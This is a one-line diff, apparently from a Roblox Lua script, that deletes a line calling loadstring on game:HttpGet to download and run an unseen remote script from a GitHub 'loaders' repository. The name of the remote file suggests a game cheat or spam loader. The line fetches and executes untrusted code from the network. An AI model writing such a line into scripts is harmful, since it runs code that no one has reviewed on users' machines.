@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/mechagodzilla2021-remodel-kaiju-alpha-spam5-pm6z2au4o6312e.lua"))()
